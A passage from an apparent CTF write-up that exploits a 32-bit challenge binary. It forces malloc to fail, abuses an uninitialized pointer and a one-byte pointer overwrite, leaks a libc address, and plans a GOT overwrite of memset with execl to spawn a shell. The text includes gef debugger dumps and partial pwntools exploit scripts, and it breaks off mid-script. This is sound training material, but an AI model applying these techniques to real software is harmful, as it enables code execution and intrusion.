</span></span><span style=display:flex><span>    <span style=color:#a6e22e>FUN_08048d40</span>();
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>It basically checks if <code>local_44</code> which is malloc result is not null and if it&rsquo;s not null it sets <code>local_34</code> pointer to <code>local_44</code> pointer.
The problem here is that <code>local_34</code> is not initialized before the check, so if the check failed, <code>local_34</code> will be whatever was on the stack. This can let us write at whatever address was on stack.
After that it performs the rot13 operation on <code>local_40</code> which is our buffer and copies the result into <code>local_34</code>.</p><h2 id=exploitation>Exploitation<a href=#exploitation class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>So we have the ability to alter the LSB of the pointer to point to another location and also the ability to write into uninitialized pointer variable if the malloc call fail. Since the uninitialized variable is on the next stack frame (at lowers addresses), we can alter the LSB of the pointer to point to next stack frame, write a desired pointer address into the uninitialized pointer address and wait for rot13 operation into that address. Now the question is how can we fail malloc call. Since the malloc is in user controll it is pretty easy to fail it, by simply give too large size that can not be served. In this case a simple <code>-1</code> will do it .</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>gef➤  c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>size: -1
</span></span><span style=display:flex><span>data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 7, 0x08048b48 in ?? <span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> Legend: Modified register | Code | Heap | Stack | String <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────── registers ────
</span></span><span style=display:flex><span>$eax   : 0xffffffff
</span></span><span style=display:flex><span>$ebx   : 0x08052000  →  0x08051f0c  →  <span style=color:#e6db74>&#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]&#34;</span>
</span></span><span style=display:flex><span>$ecx   : 0xffffffff
</span></span><span style=display:flex><span>$edx   : 0xffffd088  →  0xffffd0b8  →  0xffffd078  →  <span style=color:#e6db74>&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style=display:flex><span>$esp   : 0xffffd040  →  0xffffffff
</span></span><span style=display:flex><span>$ebp   : 0xffffd0b8  →  0xffffd078  →  <span style=color:#e6db74>&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style=display:flex><span>$esi   : 0xf7fca000  →  0x001d7d6c
</span></span><span style=display:flex><span>$edi   : 0x0       
</span></span><span style=display:flex><span>$eip   : 0x08048b48  →   call 0x8048620 &lt;malloc@plt&gt;
</span></span><span style=display:flex><span>$eflags: <span style=color:#f92672>[</span>zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────── stack ────
</span></span><span style=display:flex><span>0xffffd040│+0x0000: 0xffffffff	 ← $esp
</span></span><span style=display:flex><span>0xffffd044│+0x0004: 0x00000000
</span></span><span style=display:flex><span>0xffffd048│+0x0008: 0xffffd0b8  →  0xffffd078  →  <span style=color:#e6db74>&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style=display:flex><span>0xffffd04c│+0x000c: 0x08048b12  →   mov BYTE PTR <span style=color:#f92672>[</span>ebp-0x5d<span style=color:#f92672>]</span>, al
</span></span><span style=display:flex><span>0xffffd050│+0x0010: 0xf7fcad80  →  0xfbad2887
</span></span><span style=display:flex><span>0xffffd054│+0x0014: 0x0000000a <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\n&#34;</span>?<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>0xffffd058│+0x0018: 0x0a000058 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;X&#34;</span>?<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>0xffffd05c│+0x001c: 0xffffffff
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────── code:x86:32 ────
</span></span><span style=display:flex><span>    0x8048b41                  mov    eax, DWORD PTR <span style=color:#f92672>[</span>ebp-0x5c<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    0x8048b44                  sub    esp, 0xc
</span></span><span style=display:flex><span>    0x8048b47                  push   eax
</span></span><span style=display:flex><span>●→  0x8048b48                  call   0x8048620 &lt;malloc@plt&gt;
</span></span><span style=display:flex><span>   ↳   0x8048620 &lt;malloc@plt+0&gt;   jmp    DWORD PTR ds:0x805202c
</span></span><span style=display:flex><span>       0x8048626 &lt;malloc@plt+6&gt;   push   0x40
</span></span><span style=display:flex><span>       0x804862b &lt;malloc@plt+11&gt;  jmp    0x8048590
</span></span><span style=display:flex><span>       0x8048630 &lt;puts@plt+0&gt;     jmp    DWORD PTR ds:0x8052030
</span></span><span style=display:flex><span>       0x8048636 &lt;puts@plt+6&gt;     push   0x48
</span></span><span style=display:flex><span>       0x804863b &lt;puts@plt+11&gt;    jmp    0x8048590
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────── arguments <span style=color:#f92672>(</span>guessed<span style=color:#f92672>)</span> ────
</span></span><span style=display:flex><span>malloc@plt <span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>[</span>sp + 0x0<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> 0xffffffff,
</span></span><span style=display:flex><span>   <span style=color:#f92672>[</span>sp + 0x4<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> 0x00000000
</span></span><span style=display:flex><span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────────── threads ────
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#0] Id 1, Name: &#34;chall01_patched&#34;, stopped 0x8048b48 in ?? (), reason: BREAKPOINT</span>
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────── trace ────
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#0] 0x8048b48 → call 0x8048620 &lt;malloc@plt&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#1] 0x8048cad → mov eax, 0x0</span>
</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────────────────
</span></span><span style=display:flex><span>gef➤  ni
</span></span><span style=display:flex><span>0x08048b4d in ?? <span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> Legend: Modified register | Code | Heap | Stack | String <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────── registers ────
</span></span><span style=display:flex><span>$eax   : 0x0       
</span></span><span style=display:flex><span>$ebx   : 0x08052000  →  0x08051f0c  →  <span style=color:#e6db74>&#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX[...]&#34;</span>
</span></span><span style=display:flex><span>$ecx   : 0x0       
</span></span><span style=display:flex><span>$edx   : 0x0       
</span></span><span style=display:flex><span>$esp   : 0xffffd040  →  0xffffffff
</span></span><span style=display:flex><span>$ebp   : 0xffffd0b8  →  0xffffd078  →  <span style=color:#e6db74>&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style=display:flex><span>$esi   : 0xf7fca000  →  0x001d7d6c
</span></span><span style=display:flex><span>$edi   : 0x0       
</span></span><span style=display:flex><span>$eip   : 0x08048b4d  →   add esp, 0x10
</span></span><span style=display:flex><span>$eflags: <span style=color:#f92672>[</span>zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────── stack ────
</span></span><span style=display:flex><span>0xffffd040│+0x0000: 0xffffffff	 ← $esp
</span></span><span style=display:flex><span>0xffffd044│+0x0004: 0x00000000
</span></span><span style=display:flex><span>0xffffd048│+0x0008: 0xffffd0b8  →  0xffffd078  →  <span style=color:#e6db74>&#34;AAAAAAAAAAAAAAA&#34;</span>
</span></span><span style=display:flex><span>0xffffd04c│+0x000c: 0x08048b12  →   mov BYTE PTR <span style=color:#f92672>[</span>ebp-0x5d<span style=color:#f92672>]</span>, al
</span></span><span style=display:flex><span>0xffffd050│+0x0010: 0xf7fcad80  →  0xfbad2887
</span></span><span style=display:flex><span>0xffffd054│+0x0014: 0x0000000a <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\n&#34;</span>?<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>0xffffd058│+0x0018: 0x0a000058 <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;X&#34;</span>?<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>0xffffd05c│+0x001c: 0xffffffff
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────── code:x86:32 ────
</span></span><span style=display:flex><span>    0x8048b44                  sub    esp, 0xc
</span></span><span style=display:flex><span>    0x8048b47                  push   eax
</span></span><span style=display:flex><span>●   0x8048b48                  call   0x8048620 &lt;malloc@plt&gt;
</span></span><span style=display:flex><span> →  0x8048b4d                  add    esp, 0x10
</span></span><span style=display:flex><span>    0x8048b50                  mov    DWORD PTR <span style=color:#f92672>[</span>ebp-0x58<span style=color:#f92672>]</span>, eax
</span></span><span style=display:flex><span>    0x8048b53                  mov    eax, DWORD PTR <span style=color:#f92672>[</span>ebp-0x5c<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    0x8048b56                  sub    esp, 0x4
</span></span><span style=display:flex><span>    0x8048b59                  push   eax
</span></span><span style=display:flex><span>    0x8048b5a                  push   DWORD PTR <span style=color:#f92672>[</span>ebp-0x58<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────────── threads ────
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#0] Id 1, Name: &#34;chall01_patched&#34;, stopped 0x8048b4d in ?? (), reason: SINGLE STEP</span>
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────── trace ────
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#0] 0x8048b4d → add esp, 0x10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#1] 0x8048cad → mov eax, 0x0</span>
</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────────────────
</span></span><span style=display:flex><span>gef➤  p $eax
</span></span><span style=display:flex><span>$8 <span style=color:#f92672>=</span> 0x0
</span></span><span style=display:flex><span>gef➤ 
</span></span></code></pre></div><p>We can see here that the malloc call failed. Let&rsquo;s see now where is the uninitialized variable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>   0x804895c:	cmp    DWORD PTR <span style=color:#f92672>[</span>ebp-0x40<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>   0x8048960:	je     0x8048a0b
</span></span><span style=display:flex><span>   0x8048966:	mov    eax,DWORD PTR <span style=color:#f92672>[</span>ebp-0x40<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x8048969:	mov    DWORD PTR <span style=color:#f92672>[</span>ebp-0x30<span style=color:#f92672>]</span>,eax
</span></span><span style=display:flex><span>   0x804896c:	jmp    0x8048a0b
</span></span><span style=display:flex><span>   0x8048971:	call   0x80486b0 &lt;__ctype_b_loc@plt&gt;
</span></span><span style=display:flex><span>                .
</span></span><span style=display:flex><span>                .
</span></span><span style=display:flex><span>                .
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gef➤  p $ebp-0x30
</span></span><span style=display:flex><span>$12 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>void *<span style=color:#f92672>)</span> 0xffffd008
</span></span></code></pre></div><p>We can see here that it compares <code>[ebp-0x40]</code> address with <code>0x0</code> and if not null, it sets <code>[ebp-0x30]</code> to <code>[ebp-0x40]</code> address, so we can conclude that our uninitialized variable is at <code>ebp-0x30</code> which is <code>0xffffd008</code>. And since our pointer is at <code>0xffffd064</code>, we can alter the LSB with <code>0x08</code> so that we point to <code>0xffffd008</code> location and we can write the desire pointer address to it, the rot13 operation will be performed into that address.</p><p>Let&rsquo;s run this simple code to demonstrate it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./chall01_patched&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>ld <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./ld-2.27.so&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;size: &#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-1&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;data: &#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;AAAAAAAAAAAAAAAAAAAAAAA&#34;</span>  <span style=color:#75715e># what to write at address</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>                     <span style=color:#75715e># null terminate it to ensure everything is ok</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>64</span><span style=color:#f92672>-</span>len(payload))    <span style=color:#75715e># fill the buffer until the pointer is reached</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x08</span><span style=color:#e6db74>&#34;</span>                     <span style=color:#75715e># overwrite LSB with 0x8 (the pointer will point now to unintialized variable location )</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p32( <span style=color:#ae81ff>0x41424344</span> )           <span style=color:#75715e># write  our unintialized variable pointer address (address where we want to write )</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pause()
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>pause()
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>interactive()</span></span></code></pre></div><p>In gdb, before the malloc,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>gef➤  x/30xw $esp
</span></span><span style=display:flex><span>0xffffd044:	0x00000000	0xffe7a9b8	0x08048b12	0xf7f2bd80
</span></span><span style=display:flex><span>0xffffd054:	0x0000000a	0x0a000058	0xffffffff	0x00000000
</span></span><span style=display:flex><span>0xffffd064:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style=display:flex><span>0xffffd074:	0x41414141	0x00414141	0x41414141	0x41414141
</span></span><span style=display:flex><span>0xffffd084:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style=display:flex><span>0xffffd094:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style=display:flex><span>0xffffd0a4:	0xffe7a90d	0x00000000	0xad56ed00	0xf7f2bd80
</span></span><span style=display:flex><span>0xffffd0b4:	0x08052000	0xffe7a998
</span></span><span style=display:flex><span>gef➤  x/30xw 0xffe7a900
</span></span><span style=display:flex><span>0xffffd000:	0xf7f2b5c0	0x08047284	0x41424344	0xf7dc6f00
</span></span><span style=display:flex><span>0xffffd010:	0xf7dc7277	0x08052000	0xf7f2b5c0	0xf7dc1329
</span></span><span style=display:flex><span>0xffffd020:	0xf7f2b5c0	0x08052000	0xf7f2b000	0x00000000
</span></span><span style=display:flex><span>0xffffd030:	0xffe7a9b8	0xf7f4be20	0xf7f2c890	0x08052000
</span></span><span style=display:flex><span>0xffffd040:	0xf7f2b000	0x00000000	0xffe7a9b8	0x08048b12
</span></span><span style=display:flex><span>0xffffd050:	0xf7f2bd80	0x0000000a	0x0a000058	0xffffffff
</span></span><span style=display:flex><span>0xffffd060:	0x00000000	0x41414141	0x41414141	0x41414141
</span></span><span style=display:flex><span>0xffffd070:	0x41414141	0x41414141
</span></span><span style=display:flex><span>gef➤  
</span></span></code></pre></div><p>We can see that at <code>0xffffd008</code> , we have our pointer <code>0x41424344</code> and this is where it will write the rot13 result. Here it end with Segmantation Fault because this is a non valid address. So now we know how to write to any address (but we should pay attention to rot13 transformation). We can overwrite a <code>GOT</code> address of a given function with the address of <code>system</code>, so that if we call this function it will call system instead. But we need a function whose the first argument we control because we want <code>system</code> to call <code>/bin/sh</code>. <code>memset</code> is a good candidate since her first argument is our buffer (our inputed data). So we will overwrite <code>memset GOT</code> with the address of <code>system</code> using our uninitialised buffer primitive and for the next input we will give <code>/bin/sh</code> as data so that at <code>memset</code> call , we will have a shell.</p><p>But wait, how can we have a right <code>system</code> address ? we need the infoleak to figure out where the <code>system</code> is.</p><h4 id=infoleak>Infoleak<a href=#infoleak class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4><p>Remember that we suppose <code>PIE</code> is enabled, so we need a libc infoleak to break <code>ASLR</code> and call <code>system</code>. The libc infoleak will allow us to break <code>ASLR</code> and know the address of everything.
At first glance, we can think that the program don&rsquo;t give us any read primitive, but it&rsquo;s not true. Remember the famous <code>\r</code> I talked about.
Our buffer will not be null byte terminated if we send it and since <code>printf</code> print all bytes up to a null byte and after the rot13 operation our output buffer will also not be null byte terminated , the <code>printf("resp: %s\n",local_5c);</code> calls will print all the bytes until reaching null byte. This leak some address as we can see below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01_patched&#39;</span>: pid <span style=color:#ae81ff>371389</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;resp: NNNN\x80\xad\xf7\xf7\x87(\xad\xfb\xb8\xe2\xc2\xff \xae\xf9\xf7X\x9b\xe0\xf7\n&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/30xw 0x950d160
</span></span><span style=display:flex><span>0x984b160:	0x4e4e4e4e	0xf7f7ad80	0xfbad2887	0xffc2e2b8
</span></span><span style=display:flex><span>0x984b170:	0xf7f9ae20	0xf7e09b58	0x00000000	0x00000000
</span></span><span style=display:flex><span>0x984b180:	0x00000000	0x00000000	0x00000000	0x00000000
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/xw 0xf7fc2d80
</span></span><span style=display:flex><span>0xf7fc2d80 &lt;_IO_2_1_stdout_&gt;:	0xfbad2887
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/xw 0xfbad2887
</span></span><span style=display:flex><span>0xfbad2887:	Cannot access memory at address 0xfbad2887
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/xw 0xf7fe2e20
</span></span><span style=display:flex><span>0xf7fe2e20:	0x240c8b5a
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/xw 0xf7e51b58
</span></span><span style=display:flex><span>0xf7e51b58 &lt;puts+11&gt;:	0x00031644
</span></span></code></pre></div><p>So we can see that the last one is a libc address of <code>puts+11</code>. We can simply use it to have our libc infoleak.<br>The last thing we need is a function that can convert back from rot13 or convert to rot13 because the rot13 operation can alter some byte in our pointer, so we need to pay attention to it. I simply create a function that for the conversion stuff. So we obtain our leak:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Leak puts+11 @  0xf7dd0b4b
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Libc base @ 0xf7d69000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Addr system @ 0xf7da6200
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Addr execl @ 0xf7e28870
</span></span></code></pre></div><p>We can see here that <code>system</code> address contain a null byte and this is a problem for us because the overwrite process will stop at null byte. However, this is not a big problem, we can call others functions like <code>execve</code> , <code>execl</code> instead of <code>system</code>. <code>execl</code> is a good candidate because it doesn&rsquo;t require <code>envp</code> pointer.
So we&rsquo;re going to call <code>execl</code> to get a shell.</p><h2 id=exploit>Exploit<a href=#exploit class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Putting it all together, we get the following exploit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./chall01_patched&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>ld <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./ld-2.27.so&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
</span></span><span style=display:flex><span><span style=color:#75715e>#gdb.attach(target, &#39; source ~/breakpoint.txt&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>####  Infoleak </span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;size: &#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;1&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;data: &#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>send( <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;AAAA&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\r</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>recv <span style=color:#f92672>=</span> target<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span><span style=color:#75715e>####</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(recv )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b_leak_puts_11 <span style=color:#f92672>=</span> recv[<span style=color:#f92672>-</span><span style=color:#ae81ff>5</span>: <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rot13_f</span>(string<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>):
</span></span><span style=display:flex><span>    rot13 <span style=color:#f92672>=</span> str<span style=color:#f92672>.</span>maketrans(
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e>#print(bytearray(string))</span>
</span></span><span style=display:flex><span>    b <span style=color:#f92672>=</span> bytearray(string)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(b)):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(chr(b[i])<span style=color:#f92672>.</span>isalnum() <span style=color:#f92672>==</span> <span style=color:#66d9ef>True</span>):
</span></span><span style=display:flex><span>            b[i] <span style=color:#f92672>=</span> ord(chr(b[i])<span style=color:#f92672>.</span>translate(rot13))
</span></span><span style=display:flex><span>    <span style=color:#75715e>#print(b)</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes(b)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak_puts_11 <span style=color:#f92672>=</span> rot13_f(b_leak_puts_11)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info( <span style=color:#e6db74>&#34;Leak puts+11 @  &#34;</span> <span style=color:#f92672>+</span> hex(u32(leak_puts_11)) )
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> u32(leak_puts_11) <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>] <span style=color:#f92672>-</span> <span style=color:#ae81ff>11</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;Libc base @ &#34;</span> <span style=color:#f92672>+</span> hex(libc<span style=color:#f92672>.</span>address)) 
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info( <span style=color:#e6db74>&#34;Addr system @ &#34;</span> <span style=color:#f92672>+</span>  hex( libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]) ) 
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info( <span style=color:#e6db74>&#34;Addr execl @ &#34;</span> <span style=color:#f92672>+</span>  hex( libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;execl&#39;</span>]) ) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;y&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;size: &#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-1&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;data: &#34;</span>)
